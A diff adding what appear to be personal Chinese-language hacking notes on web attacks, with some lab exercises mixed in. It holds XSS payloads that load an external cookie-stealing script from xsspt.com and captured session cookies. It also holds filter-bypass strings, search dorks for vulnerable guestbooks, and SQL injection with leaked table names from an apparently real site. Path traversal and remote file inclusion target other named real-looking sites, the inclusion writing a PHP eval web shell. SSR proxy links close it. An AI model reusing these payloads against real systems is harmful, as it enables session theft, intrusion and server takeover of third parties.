@@ -1,0 +1,194 @@
+首先，在Xss平台上新建项目，获取代码：<script src=http://xsspt.com/kiMudL?1533777988></script>
+将该代码粘贴到目标网站留言板上，提交。      地址是：http://10.251.232.230/fwcms/
+获取  Cookie: username=admin; userid=1;PHPSESSID=nbqdkeslk1l80148o2a3fa1lb5
+进去菜刀，在浏览器栏输入http://10.251.232.230/fwcms/   右键选中扩展功能修改Cookie
+刷新浏览器，进入后台管理
+
+
+反射型XSS
+http://10.251.232.230/fwcms//search.php?keywords=<script>alert(/xss/)</script>&button=搜索
+用代码<script src=http://xsspt.com/E1kN1C?1533801502></script>替代A
+http://10.251.232.230/fwcms//search.php?keywords=A&button=搜索
+
+http://10.251.232.230/fwcms//search.php?keywords=<script src=http://xsspt.com/kiMudL?1533802572></script>&button=搜索
+<script src=http://xsspt.com/kiMudL?1533802572></script>
+
+
+http://127.0.0.1/xss/xss/example1.php?name=yhz
+
+<body onload=alert('xss')>
+
+
+5.
+<body onload=prompt('xxs')>
+<body onload=confirm('xxs')>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 65, 78, 89, 34, 41))</script>
+
+4.
+<body onload=prompt('xxs')>
+<body onload=confirm('xxs')>
+<img src=1 onerror=alert("ANY")>
+
+DOM型xss
+https://bbs.ichunqiu.com/thread-18129-1-1.html
+
+
+xsspt.com
+
+存储型xss
+低等
+<script>alert('xss')</script>       弹窗
+ 
+<script src=http://xsspt.com/gHWeLe?1533722145></script>
+Cookie: username=admin; userid=1; PHPSESSID=nbqdkeslk1l80148o2a3fa1lb5
+上传木马：attachment/201808/20180809092058_59.jpg 
+
+中等    屏蔽<script>
+name 输入：<scri<script>pt>alert('xss')</script>
+
+高等
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); 
+name输入：<img src=0 onerror=alert('aaaa') />
+name输入：<body onload=alert('XSS')> 
+
+http://10.251.232.230/fwcms/
+
+火狐插件：Cookie Manager  永久cookie
+
+XSS跨站测试代码大全：
+https://www.cnblogs.com/dsky/archive/2012/04/06/2434768.html
+
+中等
+<scri<script>pt>alert('xss')</script>
+高等
+name输入：<img src=0 onerror=alert('aaaa') />
+name输入：<body onload=alert('XSS')> 
+
+反射性xss
+http://127.0.0.1/fwcms//search.php?keywords=<script>alert(/xss/)</script>&button=搜索
+cookie : PHPSESSID=ekolj2003qa61duqdrb47up307
+
+
+http://127.0.0.1/xss/xss/example1.php
+example1
+<script>alert('xss')</script>
+
+example2
+$name = preg_replace("/<script>/","", $name);
+$name = preg_replace("/<\/script>/","", $name);
+<<script>script>alert('xss')<</script>/script>
+
+example3  大小写敏感  多重关键字
+$name = preg_replace("/<script>/i","", $name);
+$name = preg_replace("/<\/script>/i","", $name);
+<sc<script>ript>alert('xss')</sc</script>ript>
+
+example4
+if (preg_match('/script/i', $_GET["name"])) {
+<body onload=alert('XSS')>
+<body onload=prompt('xxs')>
+<body onload=confirm('xxs')>
+<img src=1 onerror=alert("ANY")>
+
+
+example5
+if (preg_match('/alert/i', $_GET["name"]))
+<script>%61%6C%65%72%74('xss')</script>  错误
+<script>0x616C657274('xss')</script>             错误
+
+
+<body onload=prompt('xxs')>
+<body onload=confirm('xxs')>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 65, 78, 89, 34, 41))</script>
+
+DOM型xss
+https://bbs.ichunqiu.com/thread-18129-1-1.html
+
+bugkuctf  XSS
+\u003cscript\u003ealert(_key_)\u003c/script\u003e
+
+
+xss漏洞搜索技巧
+google搜索：
+intext:"留言板" + intext:"所有留言"
+intext:"发表评论" + intext:"所有评论"
+inurl:"register.php" + intext:"用户名"
+
+
+
+漏洞挑战：请挖掘以下系统的安全漏洞，达到远程控制服务器的目的。
+http://www.hoshun.edu.hk/dl3/index.php?page=list.htm
+http://www.hoshun.edu.hk/dc 目录
+http://www.hoshun.edu.hk/dc/PHP_File_ans/03_fileupload.html    上传
+http://www.hoshun.edu.hk/dc/PHP_File_ans/upload/     连菜刀
+
+含有SQL和xss漏洞
+http://www.qimakj.com/register.php
+数据库
+address填入：1' and updatexml(1,cancat(0x23,database()),1) or '1
+gmaecco_gmaecsell
+表名
+address填入：1'and updatexml(1,concat(0x23,substr((select group_concat(table_name) from information_schema.tables where table_schema='gmaecco_gmaecsell'),1,31)),1) or '1
+XPATH syntax error: '#admin,affiliates,articles,artic
+XPATH syntax error: '#clesus,cart,cartoptions,clientl'
+
+弹窗
+address填入："><script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 65, 78, 89, 34, 41))</script>//
+
+
+翻墙
+https://spcloud.southeastasia.cloudapp.azure.com/
+
+联通
+ssr://OTIuMzguMTI4LjgwOjQwMTAwOmF1dGhfYWVzMTI4X3NoYTE6YWVzLTI1Ni1jdHI6aHR0cF9wb3N0OmJGWnpja1YzU3pSamJ3Lz9vYmZzcGFyYW09Wm5Sd0xuSjFMbVJsWW1saGJpNXZjbWMmcHJvdG9wYXJhbT0mcmVtYXJrcz00NENRNklHVTZZQ2E1NVMxNUwtaDU1U281b2kzNUxpVDU1U280NENSJmdyb3VwPQ
+
+
+加州YT
+ssr://MTAzLjExNC4xNjMuOTE6NDMzNzQ6YXV0aF9zaGExX3Y0OmFlcy0yNTYtY2ZiOmh0dHBfcG9zdDpkVzVpYWxNNU5tUnhjZy8_b2Jmc3BhcmFtPVpuUndMblZ6TG1SbFltbGhiaTV2Y21jJnByb3RvcGFyYW09JnJlbWFya3M9NVlxZzViZWVXVlEmZ3JvdXA9
+
+法国兰斯
+ssr://MTc4LjE3MC41NC4yNjo0MzM3NDphdXRoX2FlczEyOF9tZDU6c2Fsc2EyMDpodHRwX3Bvc3Q6ZFc1aWFsTTVObVJ4Y2cvP29iZnNwYXJhbT1ablJ3TG1aeUxtUmxZbWxoYmk1dmNtYyZwcm90b3BhcmFtPSZyZW1hcmtzPTVyT1Y1WnU5NVlXdzVwYXYmZ3JvdXA9
+
+莫斯科
+ssr://MTg1LjIwNC4yLjI0Nzo0MzM3NDphdXRoX2FlczEyOF9tZDU6c2Fsc2EyMDpodHRwX3Bvc3Q6ZFc1aWFsTTVObVJ4Y2cvP29iZnNwYXJhbT1ablJ3TG5KMUxtUmxZbWxoYmk1dmNtYyZwcm90b3BhcmFtPSZyZW1hcmtzPTZJNnI1cGF2NTZlUiZncm91cD0
+
+芬兰B、
+ssr://MTg1LjExNy4xMTkuNjk6NDMzNzQ6YXV0aF9hZXMxMjhfbWQ1OmNoYWNoYTIwOmh0dHBfcG9zdDpkVzVpYWxNNU5tUnhjZy8_b2Jmc3BhcmFtPWFYTnZMbXhwYm5WNGNYVmxjM1JwYjI1ekxtOXladyZwcm90b3BhcmFtPSZyZW1hcmtzPTZJcXM1WVd3UWcmZ3JvdXA9
+
+
+https://www.tjeffschool.org/index.php?filename=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.php&id=75&subfile=searchresults.php 
+
+https://www.tjeffschool.org/index.php?filename=../../../../../../../../../../../boot.ini
+
+
+漏洞挑战：请挖掘以下系统的安全漏洞，达到远程控制服务器的目的。
+http://wxweb.meteostar.com/models/
+http://wxweb.meteostar.com/models/models.php?PATH=var/www/models/over_thumbnails.php
+远程文件包含（没有写权限 错误）
+http://wxweb.meteostar.com/models/models.php?PATH=http://www.hoshun.edu.hk/dc/PHP_File_ans/upload/123.php
+http://wxweb.meteostar.com/models/models.php?PATH=php://input
+burp 抓 写木马
+<?php fputs(fopen('/tmp/shell.php','w'),'<?php eval($_POST[cmd])?>');?>
+连菜刀
+http://wxweb.meteostar.com/models/models.php?PATH=/tmp/shell.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
